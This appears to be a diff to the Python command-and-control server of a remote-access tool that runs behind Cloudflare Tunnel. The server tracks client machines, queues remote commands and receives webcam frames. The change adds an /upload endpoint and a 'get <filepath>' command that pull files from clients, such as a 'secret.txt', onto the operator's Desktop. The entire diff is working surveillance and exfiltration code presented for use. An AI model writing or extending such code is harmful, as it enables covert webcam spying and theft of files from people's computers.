@@ -5,7 +5,7 @@ and cancel support. Runs on Mac behind Cloudflare Tunnel.
 Usage: python3 server.py
 """
 
-VERSION = "3.0.2"
+VERSION = "3.0.3"
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
@@ -190,7 +190,8 @@ class Handler(BaseHTTPRequestHandler):
         client_id = self._parse_client_id()
 
         length = int(self.headers.get("Content-Length", 0))
-        body = self.rfile.read(length).decode(errors="replace")
+        raw_body_bytes = self.rfile.read(length)
+        body = raw_body_bytes.decode(errors="replace")
 
         if path == "/stream":
             if client_id:
@@ -240,6 +241,37 @@ class Handler(BaseHTTPRequestHandler):
                     client["interactive"] = body.strip().lower() == "true"
             self._respond(200, b"ok")
 
+        elif path == "/upload":
+            # Endpoint for clients to upload a file to the operator's Desktop
+            if not client_id:
+                self._respond(400, b"missing id")
+                return
+            parsed_path = urlparse(self.path)
+            params = parse_qs(parsed_path.query)
+            filename = params.get("filename", ["unknown_file"])[0]
+            # Sanitize: strip any path traversal, keep only the basename
+            filename = os.path.basename(filename)
+            with lock:
+                client = get_or_create_client(client_id)
+                client["last_checkin"] = time.time()
+                client["command_running"] = False
+                client["pending_stdin"] = []
+            # Read raw bytes
+            raw_bytes = raw_body_bytes
+            desktop = os.path.expanduser("~/Desktop")
+            dest = os.path.join(desktop, filename)
+            try:
+                with open(dest, "wb") as f:
+                    f.write(raw_bytes)
+                msg = f"[+] File saved to ~/Desktop/{filename} ({len(raw_bytes):,} bytes)\n"
+            except Exception as e:
+                msg = f"[!] Failed to save file: {e}\n"
+            try:
+                result_queue.put_nowait((client_id, "result", msg))
+            except queue.Full:
+                pass
+            self._respond(200, b"ok")
+
         elif path == "/camera_frame":
             # Endpoint for clients to upload camera frames (raw JPEG bytes)
             if not client_id:
@@ -249,7 +281,7 @@ class Handler(BaseHTTPRequestHandler):
                 client = get_or_create_client(client_id)
                 client["last_checkin"] = time.time()
             # Read raw bytes (not decoded text)
-            raw_body = body.encode("latin-1")  # reverse the decode(errors=replace)
+            raw_body = raw_body_bytes  # raw JPEG bytes from client
             camera_frames[client_id] = raw_body
             # Broadcast to all connected viewers
             dead_viewers = set()
@@ -330,7 +362,7 @@ def input_loop():
 
         # --- Built-in commands (always handled, even during interactive sessions) ---
         BUILTINS = {"cancel", "sessions", "status", "help", "exit"}
-        BUILTIN_PREFIXES = ("use ", "kill ", "remove ")
+        BUILTIN_PREFIXES = ("use ", "kill ", "remove ", "get ")
         is_builtin = stripped in BUILTINS or any(stripped.startswith(p) for p in BUILTIN_PREFIXES)
 
         if stripped == "cancel":
@@ -467,6 +499,7 @@ def input_loop():
             print("    Ctrl+\\            Same as cancel (keyboard shortcut)")
             print()
             print("  REMOTE COMMANDS (sent to client):")
+            print("    get <filepath>    Download file from client to ~/Desktop")
             print("    stream            Start webcam streaming on client")
             print("    stopstream        Stop webcam streaming")
             print("    version           Show client version, host, PID")
@@ -536,6 +569,28 @@ def input_loop():
                     client["pending_command"] = None
                     client["pending_stdin"] = []
             print(f"[*] Camera stream stopped on {active_client}")
+            continue
+
+        if stripped.startswith("get "):
+            filename = cmd.strip()[4:].strip()
+            if not filename:
+                print("[*] Usage: get <filepath>  (e.g. get C:\\Users\\user\\secret.txt)")
+                continue
+            with lock:
+                if not active_client:
+                    print("[*] No active client. Use 'use <id>' to select one.")
+                    continue
+                client = clients.get(active_client)
+                if not client:
+                    print(f"[!] Client {active_client} not found.")
+                    continue
+                if client["command_running"]:
+                    print(f"[!] Command already running on {active_client}. Cancel first.")
+                    continue
+                client["pending_stdin"] = []
+                client["pending_command"] = f"get:{filename}"
+                client["command_running"] = True
+            print(f"[*] Requesting '{filename}' from {active_client}...")
             continue
 
         # --- Remote command or stdin ---
